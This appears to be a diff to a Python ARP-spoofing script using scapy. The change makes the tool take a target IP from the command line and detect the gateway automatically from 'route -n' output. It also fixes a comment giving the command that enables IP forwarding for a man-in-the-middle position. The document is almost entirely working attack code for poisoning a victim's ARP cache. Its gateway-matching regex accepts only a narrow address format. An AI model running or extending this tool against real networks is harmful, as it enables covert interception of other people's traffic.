@@ -1,5 +1,22 @@
 import scapy.all as scapy
 import time
+import subprocess
+import re
+import optparse
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target_ip", help="Target IP")
+    (options, arguments) = parser.parse_args()
+    if not options.target_ip:
+        parser.error("[-] Specify an Target IP, use --help for more info")
+    return options
+
+
+def get_gateway_ip():
+    gateway_ip = re.search(r"\d\d\d.\d\d\d.\d.\d", subprocess.check_output(["route", "-n"]).decode())
+    return gateway_ip.group(0)
 
 
 def get_mac(ip):
@@ -23,8 +40,9 @@ def restore(dest_ip, src_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "192.168.31.61"
-gateway_ip = "192.168.31.1"
+options = get_arguments()
+target_ip = options.target_ip
+gateway_ip = get_gateway_ip()
 try:
     sent_packets_count = 0
     while True:
@@ -40,4 +58,4 @@ except KeyboardInterrupt:
 
 
 # IP FORWARDING
-# echo 1 > /proc/sys/net/ipv4_ip_forward
+# echo 1 > /proc/sys/net/ipv4/ip_forward
